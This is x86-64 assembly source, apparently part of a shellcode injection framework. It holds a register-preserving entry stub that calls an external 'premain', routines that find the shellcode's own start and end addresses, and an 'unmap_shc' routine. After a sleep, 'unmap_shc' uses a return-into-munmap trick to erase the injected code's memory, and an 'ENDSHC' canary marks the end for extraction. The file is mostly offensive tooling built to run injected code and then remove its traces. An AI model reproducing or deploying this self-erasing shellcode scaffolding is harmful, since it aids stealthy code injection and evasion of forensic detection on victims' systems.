
extern premain

SECTION .text$start
global _start_shc
global get_start_addr
global get_end_addr
global unmap_shc

_start_shc:
  push rax
  push rbx
  push rcx
  push rdx
  push rsi
  push rdi
  push rbp
  push r8
  push r9
  push r10
  push r11
  push r12
  push r13
  push r14
  push r15
  pushf
  mov r12, rsp
  and rsp, 0FFFFFFFFFFFFFFF0h
  sub rsp, 0x20
  call premain
  mov rsp, r12
  popf
  pop r15
  pop r14
  pop r13
  pop r12
  pop r11
  pop r10
  pop r9
  pop r8
  pop rbp
  pop rdi
  pop rsi
  pop rdx
  pop rcx
  pop rbx
  pop rax
  ret

get_start_addr:
  call _get_ret_addr
  ;; If code is modified above, this value must be updated
  sub rax, 0x49
  ret

_get_ret_addr:
  pop rax
  push rax
  ret

;;; This function will be called by a thread to erase the shellcode memory
unmap_shc:

  push rbx
  mov rbx, rdi
  mov r11, [rbx + 24]
  mov rdi, 1
  call r11                      ; call sleep

  mov rdi, [rbx + 8]            ; map_addr
  mov rsi, [rbx + 16]           ; map_size
  mov r11, [rbx]
  pop rbx
  ;; call munmap doing rop to avoid execute our code, since it will be unmapped
  push r11
  ret


SECTION .text$end

;;  WARNING: This function cannot be invoked once the memory permissions are
;;  finally adjusted since it won't have execution permissions.
get_end_addr:
  call _get_ret_addr
  add rax, 0x5
  ret

;; A canary to found the end of .text section when extracting the shellcode
_end_shc:
  db 'E', 'N', 'D', 'S', 'H', 'C'
